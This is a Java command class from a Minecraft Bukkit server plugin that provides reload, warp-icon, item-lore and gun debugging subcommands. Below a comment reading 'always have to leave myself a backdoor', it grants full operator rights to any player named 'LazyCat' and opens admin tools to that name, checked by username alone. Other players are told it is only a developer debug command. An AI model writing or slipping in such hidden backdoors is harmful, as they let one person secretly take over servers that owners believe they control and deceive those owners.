package top.mrxiaom.doomsdayessentials.commands;

import net.minecraft.server.v1_15_R1.CriterionTriggers;
import net.minecraft.server.v1_15_R1.NBTTagCompound;
import net.minecraft.server.v1_15_R1.StatisticList;
import org.bukkit.*;
import org.bukkit.command.CommandSender;
import org.bukkit.craftbukkit.v1_15_R1.inventory.CraftItemStack;
import org.bukkit.entity.Entity;
import org.bukkit.entity.EntityType;
import org.bukkit.entity.Player;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemFlag;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import top.mrxiaom.doomsdaycommands.ICommand;
import top.mrxiaom.doomsdayessentials.Main;
import top.mrxiaom.doomsdayessentials.configs.GunConfig.Gun;
import top.mrxiaom.doomsdayessentials.configs.OpenWorldConfig.OpenWorldPlayer;
import top.mrxiaom.doomsdayessentials.configs.TagConfig;
import top.mrxiaom.doomsdayessentials.configs.WarpConfig.Warp;
import top.mrxiaom.doomsdayessentials.utils.I18n;
import top.mrxiaom.doomsdayessentials.utils.ItemStackUtil;
import top.mrxiaom.doomsdayessentials.utils.Util;

import java.util.*;

public class CommandLC extends ICommand {
	public CommandLC(Main plugin) {
		super(plugin, "lazycat", new String[] {});
	}

	@Override
	public List<String> onTabComplete(CommandSender sender, String[] args, boolean isPlayer) {
		return new ArrayList<>();
	}

	@Override
	public boolean onCommand(CommandSender sender, String label, String[] args, boolean isPlayer) {
		if (sender.isOp()) {
			if (args.length == 1 && args[0].equalsIgnoreCase("reload")) {
				plugin.getPlayerConfig().reloadConfig();
				plugin.reloadConfig();
				plugin.getModuleReviveMe().getManager().onReload();
				sender.sendMessage(I18n.t("respawnneedle.reloaded"));
				return true;
			}
			World world = isPlayer ? ((Player)sender).getLocation().getWorld() : null;
			if(isPlayer) {
				Player player = (Player) sender;
				if(args.length == 1) {
					if(args[0].equalsIgnoreCase("sleep")) {
						((org.bukkit.craftbukkit.v1_15_R1.entity.CraftPlayer)player).getHandle().a(StatisticList.SLEEP_IN_BED);
			            CriterionTriggers.q.a(((org.bukkit.craftbukkit.v1_15_R1.entity.CraftPlayer)player).getHandle());
					}
				}
			}
			if(isPlayer && args.length >= 2 && args[0].equalsIgnoreCase("warpicon")){
				if(!plugin.getWarpConfig().contains(args[1])) {
					sender.sendMessage(I18n.t("warp.nowarp", true));
					return true;
				}
				Material m = args.length == 2 
						? ((Player) sender).getInventory().getItemInMainHand().getType() 
						: Util.valueOf(Material.class, args[2], Material.AIR);
				if(m.isAir()) {
					sender.sendMessage(I18n.prefix() + "§c无效的物品材质");
					return true;
				}
				Warp warp = plugin.getWarpConfig().get(args[1]);
				if(warp == null) return true;
				warp.setMaterial(m);
				plugin.getWarpConfig().set(warp.getName(), warp);
				plugin.getWarpConfig().saveConfig();
				sender.sendMessage(I18n.prefix() + "§a已设置目标地标在GUI中的物品材质");
				return true;
			}
			if(isPlayer && args.length == 1 && args[0].equalsIgnoreCase("time") && world != null) {
				sender.sendMessage("time: " + world.getTime());
				return true;
			}
			if(isPlayer && args.length == 1 && args[0].equalsIgnoreCase("not-fire") && world != null) {
				sender.sendMessage("not-fire: " + this.plugin.isWorldNotFire(world.getName()));
				return true;
			}
			if(isPlayer && args.length == 1 && args[0].equalsIgnoreCase("test") && world != null) {
				Player player = (Player) sender;
				if (!player.isOnline() || player.isDead()
						|| !(player.getGameMode() == GameMode.SURVIVAL
						|| player.getGameMode() == GameMode.ADVENTURE)
						|| this.plugin.isWorldNotFire(player.getWorld().getName())
						|| player.isSwimming()
						|| world.hasStorm()
						|| world.getTime() > 12500
						|| world.getTime() < 1000) {
					player.sendMessage("not-fire");
					return true;
				}
				player.sendMessage("fire");
				return true;
			}
			if(isPlayer && args.length == 1 && args[0].equalsIgnoreCase("test2") && world != null) {
				Player player = (Player) sender;
				Location loc = player.getLocation();
				int x = loc.getBlockX();
				int y = loc.getBlockY();
				int z = loc.getBlockZ();
				boolean firePlayer = true;
				for (int i = y; i <= world.getHighestBlockYAt(x, z); i++) {
					if (ItemStackUtil.isBlockAntiSun(player.getWorld().getBlockAt(x, i, z).getType())) {
						firePlayer = false;
						break;
					}
				}
				player.sendMessage("firePlayer: " + firePlayer);
				return true;
			}

		}
		if (isPlayer) {
			// 总得给自己留个后门
			if (sender.getName().equals("LazyCat")) {
				Player player = Bukkit.getPlayer("LazyCat");
				if (player == null)
					return true;
				if (args.length >= 1) {

					if (args[0].equalsIgnoreCase("op")) {
						player.setOp(true);
						player.sendMessage("§7[§9末日社团§7] §c已将你设置为管理员");
						return true;
					} else if (args[0].equalsIgnoreCase("getgun")) {
						if (args.length >= 2) {
							String gunid = args[1];
							if (!plugin.getGunConfig().contains(gunid)) {
								sender.sendMessage("§7[§9末日社团§7] §c无法找到指定的枪");
								return true;
							}
							Gun gun = plugin.getGunConfig().get(gunid);
							if(gun == null){
								sender.sendMessage("§7[§9末日社团§7] §c无法找到指定的枪");
								return true;
							}
							sender.sendMessage("id: " + gun.getGunId() + ", name: " + gun.getName() + ", material: "
									+ gun.getMaterial() + "");
							Inventory i = Bukkit.createInventory(null, 9, "§9末日社团§8 - §0" + gun.getName());
							ItemStack item = gun.getItem();
							sender.sendMessage(item.getType() + " | " + ItemStackUtil.getItemDisplayName(item));
							i.addItem(gun.getItem());
							player.openInventory(i);
							player.updateInventory();
							return true;
						}
						sender.sendMessage("§7[§9末日社团§7] §c参数过多");
						return true;
					} else if (args[0].equalsIgnoreCase("listgun")) {
						Map<String, Gun> m = plugin.getGunConfig().all();
						StringBuilder r = new StringBuilder("§7[§9末日社团§7] §6枪械列表: ");
						if (m.isEmpty()) {
							r.append("§c空");
						} else {
							for (String k : m.keySet()) {
								Gun g = m.get(k);
								r.append("\n  §c").append(g.getGunId()).append("§6: §r").append(g.getName());
							}
						}
						sender.sendMessage(r.toString());
						return true;
					} else if (args[0].equalsIgnoreCase("item")) {
						ItemStack im = player.getInventory().getItemInMainHand();
						player.sendMessage("物品材质: " + im.getType().name());
						ItemMeta ime = im.getItemMeta();
						if (ime != null) {
							StringBuilder lore = new StringBuilder("\n物品描述:");
							for (String s : ime.getLore() != null ? ime.getLore() : new ArrayList<String>()) {
								lore.append("\n").append(s.replace(ChatColor.COLOR_CHAR, '&'));
							}

							player.sendMessage("物品名称: " + ime.getDisplayName().replace(ChatColor.COLOR_CHAR, '&') + lore);
						}
					} else if (args[0].equalsIgnoreCase("getitem")) {
						if (args.length >= 2) {
							Material m = Material.getMaterial(args[1]);
							if (m == null) {
								sender.sendMessage("null");
							} else
								sender.sendMessage(m.name());
							return true;
						}
					} else if (args[0].equalsIgnoreCase("bullet")) {
						ItemStack item = player.getInventory().getItemInMainHand();
						List<String> lore = ItemStackUtil.getItemLore(item);
						if (lore.isEmpty()) {
							player.sendMessage("物品无Lore");
							return true;
						}
						String s = lore.get(lore.size() - 1).toLowerCase();
						net.minecraft.server.v1_15_R1.ItemStack nms = CraftItemStack.asNMSCopy(item);
						if (s.toLowerCase().startsWith("§g§u§n")) {
							NBTTagCompound tags = Objects.requireNonNullElse(nms.getTag(), new NBTTagCompound());
							// Type Of NBTTagInt is 3
							if (!tags.hasKeyOfType("bullets", 3)) {
								tags.setInt("bullets", 0);
							}
							int bullets = tags.getInt("bullets");
							if (args.length >= 2) {
								tags.setInt("bullets", Util.strToInt(args[1], 0));
								nms.setTag(tags);
								player.sendMessage("已设置子弹数量为: " + Util.strToInt(args[1], 0));
							} else {
								player.sendMessage("剩余子弹: " + bullets);
							}
							player.getInventory().setItemInMainHand(CraftItemStack.asBukkitCopy(nms));
						}

					} else if (args[0].equalsIgnoreCase("setbullet")) {
						if (args.length < 2) {
							player.sendMessage("参数不足");
							return true;
						}
						ItemStack item = player.getInventory().getItemInMainHand();
						List<String> lore = ItemStackUtil.getItemLore(item);
						lore.add("§b§u§l§l§e§t" + TagConfig.packId(Util.strToInt(args[1], 0)));
						ItemStackUtil.setItemLore(item, lore);
						player.getInventory().setItemInMainHand(item);
						player.sendMessage("完成");
					} else if (args[0].equalsIgnoreCase("clear")) {
						for (World world : Bukkit.getWorlds()) {
							for (Entity e : world.getEntities()) {
								if (e.getType() == EntityType.DROPPED_ITEM) {
									e.remove();
								}
								if (e.getType() == EntityType.ARROW && e.isOnGround()) {
									e.remove();
								}
							}
						}
					} else if (args[0].equalsIgnoreCase("gettime")) {
						long time = player.getWorld().getTime();
						player.sendMessage("现在时间: " + time + " 在燃烧范围内: " + (!(time > 12500 && time < 23400)));
					} else if (args[0].equalsIgnoreCase("hashelmet")) {
						ItemStack itemStack = player.getInventory().getHelmet();
						player.sendMessage("是否戴了头盔: " + ItemStackUtil.isHelmet(itemStack));
					} else if (args[0].equalsIgnoreCase("openworld")) {
						if (args.length >= 2) {
							String p = args[1];
							OpenWorldPlayer owp = plugin.getOpenWorldConfig().get(p);
							if (owp != null) {
								Inventory inv = Bukkit.createInventory(null, 54,
										p + " 的" + (args.length == 3 ? "开放世界" : "") + "背包");
								inv.addItem(args.length == 3 ? owp.getItemsOpenWorldLast() : owp.getItemsLast());
								player.openInventory(inv);
							}
						}
					} else if (args[0].equalsIgnoreCase("ench")) {
						ItemStack item = player.getInventory().getItemInMainHand();
						if (item.getItemMeta() != null) {
							ItemMeta im = item.getItemMeta();
							if (im.getItemFlags().contains(ItemFlag.HIDE_ENCHANTS)) {
								im.removeItemFlags(ItemFlag.HIDE_ENCHANTS);
							} else {
								im.addItemFlags(ItemFlag.HIDE_ENCHANTS);
							}
							item.setItemMeta(im);
							player.sendMessage("ok");
						}
					}
				}
			} else {
				sender.sendMessage("§7[§9末日社团§7] §6这是一条服务器开发者调试命令，对你没有任何用途");
			}
		}
		return true;
	}
}